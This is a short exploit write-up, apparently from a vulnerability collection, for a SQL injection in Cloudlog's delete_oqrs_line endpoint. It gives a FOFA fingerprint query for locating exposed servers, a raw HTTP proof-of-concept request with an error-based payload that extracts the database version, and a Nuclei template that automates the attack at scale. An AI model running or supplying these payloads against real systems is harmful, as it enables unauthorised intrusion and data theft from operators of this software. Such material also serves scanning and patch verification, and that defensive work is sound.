# fofa

```plain
icon_hash="-460032467"
```

# poc

```http
POST /index.php/oqrs/delete_oqrs_line HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close

id=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(VERSION() AS NCHAR),0x20)),1,190))),666)
```

# nuclei

```yaml
id: Cloudlog-delete_oqrs_line-sqli

info:
  name: Cloudlog delete_oqrs_line SQL injection
  author: zxf
  severity: high
  metadata: 
    fofasearch: icon_hash="-460032467"
http:
  - raw:
      - |
        POST /index.php/oqrs/delete_oqrs_line HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        id=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(VERSION() AS NCHAR),0x20)),1,190))),666)
        
    matchers:
      - type: dsl
        dsl:
          - contains_all(body,"ubuntu")
```

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1738907903726-a9d366ce-9ce7-4776-982e-37c33f4758e8.png)